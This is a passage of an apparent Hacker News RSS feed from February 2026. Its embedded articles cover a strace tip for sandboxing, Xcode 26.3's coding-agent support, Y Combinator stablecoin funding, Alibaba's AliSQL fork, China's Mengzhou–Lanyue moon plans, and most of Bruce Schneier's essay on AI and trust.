    &lt;p&gt;A useful command for this is &lt;code&gt;strace&lt;/code&gt;, which can trace file access system calls so you can see what's needed:&lt;/p&gt;
    &lt;code&gt;strace -e trace=open,openat,stat,statx,access -o /tmp/strace.log codex
&lt;/code&gt;
    &lt;p&gt;Inspecting the log you can spot which files are needed and bind them as needed.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46874139</guid><pubDate>Tue, 03 Feb 2026 17:35:37 +0000</pubDate></item><item><title>Xcode 26.3 – Developers can leverage coding agents directly in Xcode</title><link>https://www.apple.com/newsroom/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/</link><description>&lt;doc fingerprint="bd64c349434690ed"&gt;
  &lt;main&gt;
    &lt;p&gt; UPDATE February 3, 2026 &lt;/p&gt;
    &lt;head rend="h1"&gt;Xcode 26.3 unlocks the power of agentic coding&lt;/head&gt;
    &lt;p&gt; Developers can leverage coding agents, including Anthropic’s Claude Agent and OpenAI’s Codex, directly in Xcode to tackle complex tasks autonomously, helping them develop apps faster than ever &lt;/p&gt;
    &lt;p&gt;Xcode 26.3 introduces support for agentic coding, a new way in Xcode for developers to build apps using coding agents such as Anthropic’s Claude Agent and OpenAI’s Codex. With agentic coding, Xcode can work with greater autonomy toward a developer’s goals — from breaking down tasks to making decisions based on the project architecture and using built-in tools. &lt;/p&gt;
    &lt;p&gt;Expanding on the intelligence features introduced in Xcode 26, which brought a brand-new coding assistant for writing and editing in Swift, this release gives coding agents access to even more of Xcode’s capabilities. Agents like Claude Agent and Codex can now collaborate throughout the entire development life cycle, giving developers the power to streamline workflows, iterate faster, and bring ideas to life like never before. Agents can search documentation, explore file structures, update project settings, and verify their work visually by capturing Xcode Previews and iterating through builds and fixes. &lt;/p&gt;
    &lt;p&gt;“At Apple, our goal is to make tools that put industry-leading technologies directly in developers’ hands so they can build the very best apps,” said Susan Prescott, Apple’s vice president of Worldwide Developer Relations. “Agentic coding supercharges productivity and creativity, streamlining the development workflow so developers can focus on innovation.” &lt;/p&gt;
    &lt;p&gt;With seamless access to Claude Agent and Codex, developers can bring the advanced reasoning of these models directly into their app-building workflow.1 This connection combines the power of these agents with Xcode’s native capabilities to provide the best results when developing for Apple platforms, giving developers the flexibility to work with the model that best fits their project. &lt;/p&gt;
    &lt;p&gt;In addition to these built-in integrations, Xcode 26.3 makes its capabilities available through the Model Context Protocol, an open standard that gives developers the flexibility to use any compatible agent or tool with Xcode. &lt;/p&gt;
    &lt;p&gt;Availability &lt;/p&gt;
    &lt;p&gt;Xcode 26.3 is available as a release candidate for all members of the Apple Developer Program starting today, with a release coming soon on the App Store. &lt;/p&gt;
    &lt;p&gt;Share article&lt;/p&gt;
    &lt;head rend="h2"&gt;Media&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Text of this article&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Images in this article&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Anthropic and OpenAI’s terms of service may apply.&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46874619</guid><pubDate>Tue, 03 Feb 2026 18:04:08 +0000</pubDate></item><item><title>Y Combinator will let founders receive funds in stablecoins</title><link>https://fortune.com/2026/02/03/famed-startup-incubator-y-combinator-to-let-founders-receive-funds-in-stablecoins/</link><description>&lt;doc fingerprint="311217d330869b23"&gt;
  &lt;main&gt;
    &lt;p&gt;In the latest sign of digital currencies going mainstream, Silicon Valley’s most prominent startup incubator will allow its spring cohort of entrepreneurs to receive their funding in stablecoins. Y Combinator, whose alumni include the founders of Airbnb and DoorDash, announced on Tuesday that founders can opt to receive their customary allotment—typically around $500,000—in the Circle-issued USDC.&lt;/p&gt;
    &lt;p&gt;Startup founders who choose stablecoins can choose to receive the tokens on various blockchains such as Ethereum and Solana, Nemil Dalal, a visiting partner at Y Combinator who focuses on crypto, told Fortune. He added that Y Combinator may expand to other stablecoins depending on demand.&lt;/p&gt;
    &lt;p&gt;“Stablecoins is one of the key pillars for us,” Dalal said, referring to one of the areas where Y Combinator would like to see more startup ideas. “So we just want to live and breathe that as well.”&lt;/p&gt;
    &lt;head rend="h2"&gt;Price agnostic&lt;/head&gt;
    &lt;p&gt;While many crypto venture capitalists have let the startups in their portfolio take funding from stablecoins for some time, more traditional tech investors haven’t given that opportunity to founders. Dalal, for example, said he wasn’t aware of any legacy VCs who offer that option. “We’re excited for a world where, in the future, we think a lot of startups will eventually start raising capital on-chain,” he said.&lt;/p&gt;
    &lt;p&gt;Stablecoins have been around for more than a decade, but historically, their adoption was primarily limited to crypto traders seeking a non-volatile asset in which to park profits. In the past two years, however, stablecoins have burst into the headlines following a push by Wall Street and corporations that view the assets as a faster and more inexpensive way to move money around.&lt;/p&gt;
    &lt;p&gt;Big Tech has taken notice, especially after President Donald Trump signed into law in July a bill regulating the crypto assets. The fintech giant Stripe completed a $1.1 billion acquisition of stablecoin startup Bridge in February 2025 and has since backed its own blockchain designed for stablecoin transactions. The cloud infrastructure company Cloudflare announced its intention to launch its own stablecoin in September. And the buy-now, pay-later firm Klarna launched its own token as well in November.&lt;/p&gt;
    &lt;p&gt;Those announcements largely came during a more bullish crypto market that saw Bitcoin and other tokens notch all-time highs. Now, sentiment has soured as the world’s largest cryptocurrency nears monthslong lows. But, Dalal, the visiting partner at Y Combinator, said that bearish outlook doesn’t apply to stablecoins. “The excitement on stablecoins is just growing,” he said. “It’s actually agnostic of prices.”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46875033</guid><pubDate>Tue, 03 Feb 2026 18:28:48 +0000</pubDate></item><item><title>AliSQL: Alibaba's open-source MySQL with vector and DuckDB engines</title><link>https://github.com/alibaba/AliSQL</link><description>&lt;doc fingerprint="3f90b0c4553671e2"&gt;
  &lt;main&gt;
    &lt;p&gt;AliSQL is Alibaba's MySQL branch, forked from official MySQL and used extensively in Alibaba Group's production environment. It includes various performance optimizations, stability improvements, and features tailored for large-scale applications.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Quickly build your DuckDB node: How to set up a DuckDB node&lt;/p&gt;
    &lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;AliSQL Version: 8.0.44 (LTS)&lt;/item&gt;
      &lt;item&gt;Based on: MySQL 8.0.44&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;DuckDB Storage Engine:AliSQL integrates DuckDB as a native storage engine, allowing users to operate DuckDB with the same experience as MySQL. By leveraging AliSQL for rapid deployment of DuckDB service nodes, users can easily achieve lightweight analytical capabilities.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Vector Storage:AliSQL natively supports enterprise-grade vector processing for up to 16,383 dimensions. By integrating a highly optimized HNSW algorithm for high-performance Approximate Nearest Neighbor (ANN) search, AliSQL empowers users to build AI-driven applications—such as semantic search and recommendation systems—seamlessly using standard SQL interfaces.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;DDL Optimization (planned):AliSQL delivers a faster, safer, and lighter DDL experience through innovations such as enhanced Instant DDL, parallel B+tree construction, a non-blocking lock mechanism, and real-time DDL apply—significantly improving schema change efficiency and virtually eliminating replication lag.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;RTO Optimization (planned):AliSQL deeply optimizes the end-to-end crash recovery path to accelerate instance startup, shorten RTO, and restore service quickly.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Replication Optimization (planned): AliSQL significantly boosts replication throughput and minimizes lag by implementing Binlog Parallel Flush, Binlog in Redo, and specialized optimizations for large transactions and DDL operations.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Prerequisites:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;CMake 3.x or higher&lt;/item&gt;
      &lt;item&gt;Python3&lt;/item&gt;
      &lt;item&gt;C++17 compliant compiler (GCC 7+ or Clang 5+)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Build Instructions:&lt;/p&gt;
    &lt;code&gt;# Clone the repository
git clone https://github.com/alibaba/AliSQL.git
cd AliSQL

# Build the project (release build)
sh build.sh -t release -d /path/to/install/dir

# For development/debugging (debug build)
sh build.sh -t debug -d /path/to/install/dir

# Install the built MySQL server
make install&lt;/code&gt;
    &lt;p&gt;Build Options:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;-t release|debug&lt;/code&gt;: Build type (default: debug)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-d &amp;lt;dest_dir&amp;gt;&lt;/code&gt;: Installation directory (default: /usr/local/alisql or $HOME/alisql)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-s &amp;lt;server_suffix&amp;gt;&lt;/code&gt;: Server suffix (default: alisql-dev)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-g asan|tsan&lt;/code&gt;: Enable sanitizer&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-c&lt;/code&gt;: Enable GCC coverage (gcov)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-h, --help&lt;/code&gt;: Show help&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;GitHub Issues: https://github.com/alibaba/AliSQL/issues&lt;/item&gt;
      &lt;item&gt;Alibaba Cloud RDS: DuckDB-based Analytical Instance&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;p&gt;For DuckDB-specific support, see the DuckDB Support Options.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;AliSQL 8.0 became an open-source project in December 2025 and is actively maintained by engineers at Alibaba Group.&lt;/p&gt;
    &lt;p&gt;Contributions are welcome! Please:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Fork the repository&lt;/item&gt;
      &lt;item&gt;Create a feature branch&lt;/item&gt;
      &lt;item&gt;Make your changes with appropriate tests&lt;/item&gt;
      &lt;item&gt;Submit a pull request&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For bug reports and feature requests, please use the GitHub Issues page.&lt;/p&gt;
    &lt;p&gt;This project is licensed under the GPL-2.0 license. See the LICENSE file for details.&lt;/p&gt;
    &lt;p&gt;AliSQL is based on MySQL, which is licensed under GPL-2.0. The DuckDB integration follows the same licensing terms.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46875228</guid><pubDate>Tue, 03 Feb 2026 18:40:18 +0000</pubDate></item><item><title>China Moon Mission: Aiming for 2030 lunar landing</title><link>https://spectrum.ieee.org/china-moon-mission-mengzhou-artemis</link><description>&lt;doc fingerprint="77af907574e51d69"&gt;
  &lt;main&gt;
    &lt;p&gt;Slow and steady wins the race, or so goes the fable. The China Manned Space Agency, or CMSA, has repeatedly denied any rivalry with the United States akin to the race to the moon in the 1960s. But step-by-step, one element at a time over a period of decades, it has built a human space program with goals that include landing astronauts on the moon by 2030 and starting a base there in the following years. And—partly because launch dates for NASA’s Artemis III moon landing keep slipping toward that same time frame—U.S. space leaders are ratcheting up the space race rhetoric.&lt;/p&gt;
    &lt;p&gt;“We are in a great competition with a rival that has the will and means to challenge American exceptionalism across multiple domains, including in the high ground of space,” said Jared Isaacman, the new head of NASA, in December. “This is not the time for delay, but for action, because if we fall behind—if we make a mistake—we may never catch up, and the consequences could shift the balance of power here on Earth.”&lt;/p&gt;
    &lt;p&gt;NASA’s Artemis II is almost ready to take its crew on a circumlunar test flight, and the White House has said that U.S. astronauts should prioritize a lunar landing by 2028—but could China slip in ahead? How would a Chinese moon flight work? Does the Chinese space program have technology that matches or beats the United States?&lt;/p&gt;
    &lt;p&gt;RELATED: Inside the Spacecraft That Will Carry Humans Around the Moon&lt;/p&gt;
    &lt;p&gt;“Nobody [in China] would argue that we are in a space race,” says Namrata Goswami, a professor at Johns Hopkins University who has written extensively about China’s space effort, “but they might be engaged in activity that showcases China as a space power, and they are very serious about getting somewhere first.”&lt;/p&gt;
    &lt;head rend="h2"&gt;What Are the Mengzhou and Lanyue Spacecraft?&lt;/head&gt;
    &lt;p&gt;China’s lunar hardware builds on existing engineering. It is based on a multipurpose crew ship called Mengzhou, with capacity for six or seven astronauts, though as few as three may actually fly on a trip from Earth to low lunar orbit. (China watchers dispense with the word “taikonaut” for its crew members, by the way; the word was coined in 1998 and has not been used by the Chinese government itself. China generally uses the word yuhangyuan, roughly translated as “traveler of the universe.”)&lt;/p&gt;
    &lt;p&gt;Mengzhou, according to what the CMSA has shown, includes a crew section in the shape of a truncated cone or frustum, with a service module holding power and propulsion systems in the rear. If you squint at it, you’ll see a resemblance to the American Artemis or Apollo spacecraft, the SpaceX Crew Dragon, or the yet-to-be-flown European Nyx. Basic aerodynamics make a blunt cone a very efficient shape for safely launching a spacecraft and returning it through Earth’s atmosphere.&lt;/p&gt;
    &lt;p&gt;The Mengzhou command ship uses parachutes and airbags during a 2025 landing test in northwest China.Wang Heng/Xinhua/Getty Images&lt;/p&gt;
    &lt;p&gt;Mengzhou is billed as reusable, with an outer heat shield that can be replaced after flight. Landings would take place in China’s western desert. “Coupled with the landing method of airbag cushioning,” says the CMSA in a translated statement, “the spacecraft itself can be better protected from damage and allow the reuse of the spacecraft.”&lt;/p&gt;
    &lt;p&gt;The ship would be launched by a new heavy-lift Long March 10 booster, one of two used for a given moon mission. The Long March 10, as configured for lunar flight, would stand 92.5 meters high at launch and generate thrust of 2,678 tonnes. (The rocket for Artemis II is more powerful: 3,992 tonnes.)&lt;/p&gt;
    &lt;p&gt;Mengzhou would leave for the moon after another Long March 10 has launched a lunar landing craft called Lanyue. The two would rendezvous and dock in lunar orbit. Two astronauts would transfer to Lanyue and land on the moon’s surface; Mengzhou would wait for them in orbit for the trip home. Lanyue has a stated mass of 26 tonnes and could carry a 200-kilogram rover.&lt;/p&gt;
    &lt;p&gt;Chinese authorities say testing of Lanyue began in 2024. Mengzhou should go on its first robotic flight in 2026; Lanyue, in 2027. The first joint test mission is planned for 2028 or 2029, with the first crew going to the moon a year after that.&lt;/p&gt;
    &lt;head rend="h2"&gt;What Is China’s Long-Term Plan for Space?&lt;/head&gt;
    &lt;p&gt;But to focus on their hardware is to miss out on a major difference between the Chinese and U.S. moon-landing efforts. Artemis is the product of a start-again stop-again debate that’s been going on in the U.S. government since Apollo ended in the 1970s. Goals have shifted repeatedly—often when new presidents took office. Conversely, the Chinese campaign is the outgrowth of a plan called Project 921, first backed by the Chinese Communist Party in 1992. There have been updates and some technical setbacks, but China has pretty much stuck to it ever since.&lt;/p&gt;
    &lt;p&gt;“What the Chinese space effort has done that others have not is integrate everything,” says Goswami. “It’s not just ‘We’re going to mount a mission.’ It’s bigger than that. They view space as an activity and not missions.”&lt;/p&gt;
    &lt;p&gt;In other words, she says, each new piece of technology is part of a coordinated effort to create a sustained presence in space, which pays economic, geopolitical, and sometimes military dividends. Each part, so far, has fit together with other parts: The first orbiting capsule, called Shenzhou 1 in 1999, led to the first flight by an astronaut, Yang Lewei, on Shenzhou 5 in 2003. That led to space stations (the Tiangong series, starting in 2011), to which Shenzhou crews have been flying since in regular rotation (Shenzhou 22 launched in November). Mengzhou will eventually take over as the workhorse crew vehicle for Earth-orbiting flights.&lt;/p&gt;
    &lt;p&gt;In the meantime, there has been a steady cadence of robotic lunar orbiters and landers (Chang’e-6 returned the first-ever soil sample from the moon’s far side in 2024), soon to be followed, we’re now told, by Chinese astronauts.&lt;/p&gt;
    &lt;p&gt;They started slowly, deliberately, with long breaks between missions, only recently picking up speed. At times they have unabashedly looked to other countries for guidance: The Shenzhou crew capsule in the 1990s borrowed heavily from the design of the Russian Soyuz. And several engineers today point out that the Mengzhou-Lanyue plan sounds in many ways like what then-administrator Michael Griffin proposed for NASA’s Constellation program back in 2005—a crewed ship launched by one rocket, a moon lander by another, with astronauts transferring to the lander once they reach lunar orbit. A crew capsule and lunar lander would be too much for one launch, as with the Apollo–Saturn V, because landings would be more ambitious than could be achieved with Apollo’s minimalist lunar module, with longer stays and equipment for a lunar base.&lt;/p&gt;
    &lt;p&gt;“The Chinese are pursuing an architecture a lot like the Apollo architecture was. Which is understandable because their ambitions are to go fast, and Apollo worked,” says a former senior NASA manager who, like several others, asked not to be quoted by name.&lt;/p&gt;
    &lt;p&gt;“I have a lot of friends who have been watching the Chinese space program for the last couple of decades,” this person continued. “And the one hallmark that we can say is that when China announces dates for things, they typically maintain them.”&lt;/p&gt;
    &lt;head rend="h2"&gt;“Our Great Rival”&lt;/head&gt;
    &lt;p&gt;And that is why Jared Isaacman talks of urgency at NASA. He has so far generally avoided the word “China” in public. The Chinese, in his words, are usually “our great rival” or “a competitor.” Some NASA veterans say China may turn out to be giving the agency a helpful push to be faster and more agile. They say Apollo succeeded, in large part, because of the race to beat the Soviet Union. A Chinese challenge—even unstated, even illusory—may help Artemis move along.&lt;/p&gt;
    &lt;p&gt;“We have a great competitor that is moving at absolutely impressive speeds,” Isaacman told NASA employees, “and it’s unsettling to consider the implications if we fail to maintain our technological, scientific, or economic edge in space. And the clock is running.”&lt;/p&gt;
    &lt;p&gt;This is part 2 of a three-part series, Back to the Moon. Part 1 is about the technology behind NASA’s Artemis II mission. Part 3 will look at how NASA reinvigorated its human spaceflight program.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The 5 Spacecraft Behind China’s Moon Rock Sample Mission ›&lt;/item&gt;
      &lt;item&gt;China's Moon Missions Shadow NASA Artemis's Pace - IEEE ... ›&lt;/item&gt;
      &lt;item&gt;China Aims for a Permanent Moon Base in the 2030s - IEEE Spectrum ›&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Ned Potter is a New York writer who spent more than 25 years as an ABC News and CBS News correspondent covering science, technology, space, and the environment.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46876047</guid><pubDate>Tue, 03 Feb 2026 19:32:11 +0000</pubDate></item><item><title>Data centers in space makes no sense</title><link>https://civai.org/blog/space-data-centers</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46876105</guid><pubDate>Tue, 03 Feb 2026 19:37:30 +0000</pubDate></item><item><title>AI and Trust (2023)</title><link>https://www.schneier.com/blog/archives/2023/12/ai-and-trust.html</link><description>&lt;doc fingerprint="af809351a1650441"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;AI and Trust&lt;/head&gt;
    &lt;p&gt;I trusted a lot today. I trusted my phone to wake me on time. I trusted Uber to arrange a taxi for me, and the driver to get me to the airport safely. I trusted thousands of other drivers on the road not to ram my car on the way. At the airport, I trusted ticket agents and maintenance engineers and everyone else who keeps airlines operating. And the pilot of the plane I flew in. And thousands of other people at the airport and on the plane, any of which could have attacked me. And all the people that prepared and served my breakfast, and the entire food supply chain—any of them could have poisoned me. When I landed here, I trusted thousands more people: at the airport, on the road, in this building, in this room. And that was all before 10:30 this morning.&lt;/p&gt;
    &lt;p&gt;Trust is essential to society. Humans as a species are trusting. We are all sitting here, mostly strangers, confident that nobody will attack us. If we were a roomful of chimpanzees, this would be impossible. We trust many thousands of times a day. Society can’t function without it. And that we don’t even think about it is a measure of how well it all works.&lt;/p&gt;
    &lt;p&gt;In this talk, I am going to make several arguments. One, that there are two different kinds of trust—interpersonal trust and social trust—and that we regularly confuse them. Two, that the confusion will increase with artificial intelligence. We will make a fundamental category error. We will think of AIs as friends when they’re really just services. Three, that the corporations controlling AI systems will take advantage of our confusion to take advantage of us. They will not be trustworthy. And four, that it is the role of government to create trust in society. And therefore, it is their role to create an environment for trustworthy AI. And that means regulation. Not regulating AI, but regulating the organizations that control and use AI.&lt;/p&gt;
    &lt;p&gt;Okay, so let’s back up and take that all a lot slower. Trust is a complicated concept, and the word is overloaded with many meanings. There’s personal and intimate trust. When we say that we trust a friend, it is less about their specific actions and more about them as a person. It’s a general reliance that they will behave in a trustworthy manner. We trust their intentions, and know that those intentions will inform their actions. Let’s call this “interpersonal trust.”&lt;/p&gt;
    &lt;p&gt;There’s also the less intimate, less personal trust. We might not know someone personally, or know their motivations—but we can trust their behavior. We don’t know whether or not someone wants to steal, but maybe we can trust that they won’t. It’s really more about reliability and predictability. We’ll call this “social trust.” It’s the ability to trust strangers.&lt;/p&gt;
    &lt;p&gt;Interpersonal trust and social trust are both essential in society today. This is how it works. We have mechanisms that induce people to behave in a trustworthy manner, both interpersonally and socially. This, in turn, allows others to be trusting. Which enables trust in society. And that keeps society functioning. The system isn’t perfect—there are always going to be untrustworthy people—but most of us being trustworthy most of the time is good enough.&lt;/p&gt;
    &lt;p&gt;I wrote about this in 2012 in a book called Liars and Outliers. I wrote about four systems for enabling trust: our innate morals, concern about our reputations, the laws we live under, and security technologies that constrain our behavior. I wrote about how the first two are more informal than the last two. And how the last two scale better, and allow for larger and more complex societies. They enable cooperation amongst strangers.&lt;/p&gt;
    &lt;p&gt;What I didn’t appreciate is how different the first and last two are. Morals and reputation are person to person, based on human connection, mutual vulnerability, respect, integrity, generosity, and a lot of other things besides. These underpin interpersonal trust. Laws and security technologies are systems of trust that force us to act trustworthy. And they’re the basis of social trust.&lt;/p&gt;
    &lt;p&gt;Taxi driver used to be one of the country’s most dangerous professions. Uber changed that. I don’t know my Uber driver, but the rules and the technology lets us both be confident that neither of us will cheat or attack each other. We are both under constant surveillance and are competing for star rankings.&lt;/p&gt;
    &lt;p&gt;Lots of people write about the difference between living in a high-trust and a low-trust society. How reliability and predictability make everything easier. And what is lost when society doesn’t have those characteristics. Also, how societies move from high-trust to low-trust and vice versa. This is all about social trust.&lt;/p&gt;
    &lt;p&gt;That literature is important, but for this talk the critical point is that social trust scales better. You used to need a personal relationship with a banker to get a loan. Now it’s all done algorithmically, and you have many more options to choose from.&lt;/p&gt;
    &lt;p&gt;Social trust scales better, but embeds all sorts of bias and prejudice. That’s because, in order to scale, social trust has to be structured, system- and rule-oriented, and that’s where the bias gets embedded. And the system has to be mostly blinded to context, which removes flexibility.&lt;/p&gt;
    &lt;p&gt;But that scale is vital. In today’s society we regularly trust—or not—governments, corporations, brands, organizations, groups. It’s not so much that I trusted the particular pilot that flew my airplane, but instead the airline that puts well-trained and well-rested pilots in cockpits on schedule. I don’t trust the cooks and waitstaff at a restaurant, but the system of health codes they work under. I can’t even describe the banking system I trusted when I used an ATM this morning. Again, this confidence is no more than reliability and predictability.&lt;/p&gt;
    &lt;p&gt;Think of that restaurant again. Imagine that it’s a fast food restaurant, employing teenagers. The food is almost certainly safe—probably safer than in high-end restaurants—because of the corporate systems or reliability and predictability that is guiding their every behavior.&lt;/p&gt;
    &lt;p&gt;That’s the difference. You can ask a friend to deliver a package across town. Or you can pay the Post Office to do the same thing. The former is interpersonal trust, based on morals and reputation. You know your friend and how reliable they are. The second is a service, made possible by social trust. And to the extent that is a reliable and predictable service, it’s primarily based on laws and technologies. Both can get your package delivered, but only the second can become the global package delivery systems that is FedEx.&lt;/p&gt;
    &lt;p&gt;Because of how large and complex society has become, we have replaced many of the rituals and behaviors of interpersonal trust with security mechanisms that enforce reliability and predictability—social trust.&lt;/p&gt;
    &lt;p&gt;But because we use the same word for both, we regularly confuse them. And when we do that, we are making a category error.&lt;/p&gt;
    &lt;p&gt;And we do it all the time. With governments. With organizations. With systems of all kinds. And especially with corporations.&lt;/p&gt;
    &lt;p&gt;We might think of them as friends, when they are actually services. Corporations are not moral; they are precisely as immoral as the law and their reputations let them get away with.&lt;/p&gt;
    &lt;p&gt;So corporations regularly take advantage of their customers, mistreat their workers, pollute the environment, and lobby for changes in law so they can do even more of these things.&lt;/p&gt;
    &lt;p&gt;Both language and the laws make this an easy category error to make. We use the same grammar for people and corporations. We imagine that we have personal relationships with brands. We give corporations some of the same rights as people.&lt;/p&gt;
    &lt;p&gt;Corporations like that we make this category error—see, I just made it myself—because they profit when we think of them as friends. They use mascots and spokesmodels. They have social media accounts with personalities. They refer to themselves like they are people.&lt;/p&gt;
    &lt;p&gt;But they are not our friends. Corporations are not capable of having that kind of relationship.&lt;/p&gt;
    &lt;p&gt;We are about to make the same category error with AI. We’re going to think of them as our friends when they’re not.&lt;/p&gt;
    &lt;p&gt;A lot has been written about AIs as existential risk. The worry is that they will have a goal, and they will work to achieve it even if it harms humans in the process. You may have read about the “paperclip maximizer“: an AI that has been programmed to make as many paper clips as possible, and ends up destroying the earth to achieve those ends. It’s a weird fear. Science fiction author Ted Chiang writes about it. Instead of solving all of humanity’s problems, or wandering off proving mathematical theorems that no one understands, the AI single-mindedly pursues the goal of maximizing production. Chiang’s point is that this is every corporation’s business plan. And that our fears of AI are basically fears of capitalism. Science fiction writer Charlie Stross takes this one step further, and calls corporations “slow AI.” They are profit maximizing machines. And the most successful ones do whatever they can to achieve that singular goal.&lt;/p&gt;
    &lt;p&gt;And near-term AIs will be controlled by corporations. Which will use them towards that profit-maximizing goal. They won’t be our friends. At best, they’ll be useful services. More likely, they’ll spy on us and try to manipulate us.&lt;/p&gt;
    &lt;p&gt;This is nothing new. Surveillance is the business model of the Internet. Manipulation is the other business model of the Internet.&lt;/p&gt;
    &lt;p&gt;Your Google search results lead with URLs that someone paid to show to you. Your Facebook and Instagram feeds are filled with sponsored posts. Amazon searches return pages of products whose sellers paid for placement.&lt;/p&gt;
    &lt;p&gt;This is how the Internet works. Companies spy on us as we use their products and services. Data brokers buy that surveillance data from the smaller companies, and assemble detailed dossiers on us. Then they sell that information back to those and other companies, who combine it with data they collect in order to manipulate our behavior to serve their interests. At the expense of our own.&lt;/p&gt;
    &lt;p&gt;We use all of these services as if they are our agents, working on our behalf. In fact, they are double agents, also secretly working for their corporate owners. We trust them, but they are not trustworthy. They’re not friends; they’re services.&lt;/p&gt;
    &lt;p&gt;It’s going to be no different with AI. And the result will be much worse, for two reasons.&lt;/p&gt;
    &lt;p&gt;The first is that these AI systems will be more relational. We will be conversing with them, using natural language. As such, we will naturally ascribe human-like characteristics to them.&lt;/p&gt;
    &lt;p&gt;This relational nature will make it easier for those double agents to do their work. Did your chatbot recommend a particular airline or hotel because it’s truly the best deal, given your particular set of needs? Or because the AI company got a kickback from those providers? When you asked it to explain a political issue, did it bias that explanation towards the company’s position? Or towards the position of whichever political party gave it the most money? The conversational interface will help hide their agenda.&lt;/p&gt;
    &lt;p&gt;The second reason to be concerned is that these AIs will be more intimate. One of the promises of generative AI is a personal digital assistant. Acting as your advocate with others, and as a butler with you. This requires an intimacy greater than your search engine, email provider, cloud storage system, or phone. You’re going to want it with you 24/7, constantly training on everything you do. You will want it to know everything about you, so it can most effectively work on your behalf.&lt;/p&gt;
    &lt;p&gt;And it will help you in many ways. It will notice your moods and know what to suggest. It will anticipate your needs and work to satisfy them. It will be your therapist, life coach, and relationship counselor.&lt;/p&gt;
    &lt;p&gt;You will default to thinking of it as a friend. You will speak to it in natural language, and it will respond in kind. If it is a robot, it will look humanoid—or at least like an animal. It will interact with the whole of your existence, just like another person would.&lt;/p&gt;
    &lt;p&gt;The natural language interface is critical here. We are primed to think of others who speak our language as people. And we sometimes have trouble thinking of others who speak a different language that way. We make that category error with obvious non-people, like cartoon characters. We will naturally have a “theory of mind” about any AI we talk with.&lt;/p&gt;
    &lt;p&gt;More specifically, we tend to assume that something’s implementation is the same as its interface. That is, we assume that things are the same on the inside as they are on the surface. Humans are like that: we’re people through and through. A government is systemic and bureaucratic on the inside. You’re not going to mistake it for a person when you interact with it. But this is the category error we make with corporations. We sometimes mistake the organization for its spokesperson. AI has a fully relational interface—it talks like a person—but it has an equally fully systemic implementation. Like a corporation, but much more so. The implementation and interface are more divergent than anything we have encountered to date—by a lot.&lt;/p&gt;
    &lt;p&gt;And you will want to trust it. It will use your mannerisms and cultural references. It will have a convincing voice, a confident tone, and an authoritative manner. Its personality will be optimized to exactly what you like and respond to.&lt;/p&gt;
    &lt;p&gt;It will act trustworthy, but it will not be trustworthy. We won’t know how they are trained. We won’t know their secret instructions. We won’t know their biases, either accidental or deliberate.&lt;/p&gt;
    &lt;p&gt;We do know that they are built at enormous expense, mostly in secret, by profit-maximizing corporations for their own benefit.&lt;/p&gt;
    &lt;p&gt;It’s no accident that these corporate AIs have a human-like interface. There’s nothing inevitable about that. It’s a design choice. It could be designed to be less personal, less human-like, more obviously a service—like a search engine . The companies behind those AIs want you to make the friend/service category error. It will exploit your mistaking it for a friend. And you might not have any choice but to use it.&lt;/p&gt;
    &lt;p&gt;There is something we haven’t discussed when it comes to trust: power. Sometimes we have no choice but to trust someone or something because they are powerful. We are forced to trust the local police, because they’re the only law enforcement authority in town. We are forced to trust some corporations, because there aren’t viable alternatives. To be more precise, we have no choice but to entrust ourselves to them. We will be in this same position with AI. We will have no choice but to entrust ourselves to their decision-making.&lt;/p&gt;
    &lt;p&gt;The friend/service confusion will help mask this power differential. We will forget how powerful the corporation behind the AI is, because we will be fixated on the person we think the AI is.&lt;/p&gt;
